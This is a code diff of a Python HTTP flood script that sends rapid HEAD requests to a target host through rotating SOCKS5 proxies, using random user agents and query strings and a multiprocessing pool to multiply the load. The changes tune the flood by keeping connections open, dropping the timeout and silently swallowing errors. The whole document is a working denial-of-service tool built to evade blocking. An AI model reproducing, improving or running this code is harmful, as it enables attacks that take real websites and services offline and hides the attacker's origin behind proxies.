@@ -1,4 +1,4 @@
-import ssl
+import ssl, threading
 import multiprocessing
 import socket
 import random
@@ -100,29 +100,28 @@ def checkProxies():
 
 time.sleep(1)
 
-def Flood(indexPicker):
+# Xoa darkdarkbruhbruhlmaolmao neu muon dung Process Class
+def Flood(darkdarkbruhbruhlmaolmao):
+    proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
     Accept = rC(AcceptHeaders)
     User_Agent = "User-Agent: " + rC(userAgentList) + "\r\n\r\n"
     while True:
         try:
-            proxy = rC(proxies).strip().split(":")
             s = socks.socksocket()
             s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
-            s.settimeout(5)
             s.connect((targetHost, targetPort))
             if targetPort == 443:
                 sslContext = ssl.SSLContext()
                 s = sslContext.wrap_socket(s, server_hostname=targetHost)
             for _ in range(100):
-                valueParams = "?{}={}&{}={}".format(rC(queryParams), rI(1, 65535), rC(queryParams), rI(1, 65535))
+                valueParams = "?{}={}".format(rC(queryParams), rI(1, 65535))
                 floodHeader = "HEAD {}{} HTTP/1.1\r\nHost: {}\r\n".format(targetPath, valueParams, targetHost) + Connection + Accept + User_Agent
                 floodHeader = floodHeader.encode()
                 s.send(floodHeader)
-            s.close()
             print("Flood sent " + proxy[0] + ":" + proxy[1])
         except:
-            time.sleep(0.01)
+            pass
 
 if "--socksCrawler" in sys.argv:
     socksCrawler()
@@ -144,9 +143,15 @@ userAgentList = []
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
+"""processList = []
 for indexPicker in range(threadNumber):
-    process = multiprocessing.Process(target=Flood, args=(indexPicker, ))
-    process.setDaemon = False
+    process = multiprocessing.Process(target=Flood)
+    process.Daemon = True
+    processList.append(process)
     process.start()
-
-
+for process in processList:
+    process.join()"""
+darkdarkbruhbruhlmaolmao = multiprocessing.Pool(processes=threadNumber)
+darkdarkbruhbruhlmaolmao.map(Flood, range(threadNumber))
+"""while True:
+    input()"""
